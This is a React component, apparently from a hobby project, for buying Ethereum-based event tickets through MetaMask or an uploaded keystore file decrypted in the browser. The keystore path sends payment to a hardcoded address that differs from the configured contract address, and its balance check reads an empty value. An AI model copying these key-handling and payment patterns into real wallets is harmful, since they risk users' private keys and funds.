import React, { useState } from 'react';
import { initWeb3, getTicketPrice } from './TicketToken';
import '../styles/BuyTicket.css';

const BuyTicket = () => {
  const [walletAddress, setWalletAddress] = useState('');
  const [keystore, setKeystore] = useState(null);
  const [password, setPassword] = useState('');
  const [ticketAmount, setTicketAmount] = useState('');
  const [ticketPrice, setTicketPrice] = useState('');
  const [walletBalance, setWalletBalance] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [transactionRequest, setTransactionRequest] = useState(null); 
  const [transactionResult, setTransactionResult] = useState(null); 

  const connectWallet = async () => {
    try {
      const { web3 } = await initWeb3();
      const accounts = await web3.eth.requestAccounts();
      if (accounts.length > 0) {
        setWalletAddress(accounts[0]);
        const balance = await web3.eth.getBalance(accounts[0]);
        setWalletBalance(web3.utils.fromWei(balance, 'ether'));
        setMessage('Wallet connected successfully.');
      } else {
        setMessage('No wallet connected. Please connect your wallet.');
      }
    } catch (error) {
      console.error('Error connecting wallet:', error);
      setMessage('Failed to connect wallet. Please try again.');
    }
  };

  const handleFileUpload = (event) => {
    const file = event.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => setKeystore(e.target.result);
      reader.readAsText(file);
    }
  };

  const handleBuyTicket = async () => {
    if (!walletAddress && (!keystore || !password)) {
      setMessage('Please connect your wallet or upload a keystore file with a password.');
      return;
    }

    if (ticketAmount > 2) {
      setMessage('You can only buy a maximum of 2 tickets.');
      return;
    }

    setLoading(true);
    setMessage('');
    setTransactionRequest(null);
    setTransactionResult(null);

    try {
      const { web3 } = await initWeb3();
      const priceInEther = await getTicketPrice();
      const priceInWei = web3.utils.toWei(priceInEther, 'ether');
      const totalCost = web3.utils.toBN(priceInWei).mul(web3.utils.toBN(ticketAmount)).toString();

      const balanceInWei = walletAddress
        ? await web3.eth.getBalance(walletAddress)
        : web3.utils.toWei(walletBalance, 'ether');

      if (web3.utils.toBN(balanceInWei).lt(web3.utils.toBN(totalCost))) {
        setMessage('Insufficient balance to purchase tickets.');
        setLoading(false);
        return;
      }

      if (walletAddress) {
        const txRequest = {
          from: walletAddress,
          to: process.env.REACT_APP_CONTRACT_ADDRESS,
          value: totalCost,
          gas: 2000000,
          data: web3.eth.abi.encodeFunctionCall(
            {
              name: 'buyTicket',
              type: 'function',
              inputs: [{ type: 'uint256', name: 'amount' }],
            },
            [ticketAmount]
          ),
        };

        setTransactionRequest(txRequest); // Save transaction request

        const receipt = await web3.eth.sendTransaction(txRequest);
        setTransactionResult(receipt); // Save transaction result
        setMessage(`Successfully purchased ${ticketAmount} ticket(s).`);
      } else if (keystore && password) {
        const wallet = web3.eth.accounts.decrypt(keystore, password);

        const txRequest = {
          to: '0x1854cab9bdcaac14c95a9a58a41ef5defd607e33',
          value: totalCost,
          gas: 2000000,
          data: web3.eth.abi.encodeFunctionCall(
            {
              name: 'buyTicket',
              type: 'function',
              inputs: [{ type: 'uint256', name: 'amount' }],
            },
            [ticketAmount]
          ),
        };

        setTransactionRequest(txRequest); // Save transaction request

        const signedTx = await web3.eth.accounts.signTransaction(txRequest, wallet.privateKey);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        setTransactionResult(receipt); // Save transaction result
        setMessage(`Successfully purchased ${ticketAmount} ticket(s). Transaction Hash: ${receipt.transactionHash}`);
      }
    } catch (error) {
      console.error('Error buying tickets:', error);
      setMessage('Failed to purchase tickets. Please try again.');
    }
    setLoading(false);
  };

  const fetchTicketPrice = async () => {
    try {
      const price = await getTicketPrice();
      setTicketPrice(price);
    } catch (error) {
      console.error('Error fetching ticket price:', error);
    }
  };

  return (
    <div className="buy-ticket-container">
      <h1 className="title">Buy Tickets</h1>

      <div className="input-group">
        <label>Wallet Address (MetaMask):</label>
        <input type="text" value={walletAddress} readOnly placeholder="Connect your wallet" />
        <button onClick={connectWallet}>Connect Wallet</button>
      </div>
      {walletBalance && <p className="info">Wallet Balance: {walletBalance} ETH</p>}

      <div className="input-group">
        <label>Keystore File:</label>
        <input type="file" accept=".json" onChange={handleFileUpload} />
      </div>

      <div className="input-group">
        <label>Password:</label>
        <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your keystore password" />
      </div>

      <div className="input-group">
        <label>Ticket Amount:</label>
        <input
          type="number"
          value={ticketAmount}
          onChange={(e) => setTicketAmount(Math.min(2, e.target.value))} // Restrict input to max 2
          placeholder="Enter ticket amount (max 2)"
          max="2"
        />
      </div>

      <div className="input-group">
        <button onClick={fetchTicketPrice}>Check Ticket Price</button>
        {ticketPrice && <p className="info">Ticket Price: {ticketPrice} ETH</p>}
      </div>

      <div className="action-group">
        <button onClick={handleBuyTicket} disabled={loading} className="buy-button">
          {loading ? 'Processing...' : 'Buy Tickets'}
        </button>
      </div>

      {message && <p className={`message ${loading ? 'loading' : 'error'}`}>{message}</p>}

      {transactionRequest && (
        <div className="transaction-details">
          <h3>Transaction Request</h3>
          <pre>{JSON.stringify(transactionRequest, null, 2)}</pre>
        </div>
      )}

      {transactionResult && (
        <div className="transaction-details">
          <h3>Transaction Result</h3>
          <pre>{JSON.stringify(transactionResult, null, 2)}</pre>
        </div>
      )}
    </div>
  );
};

export default BuyTicket;
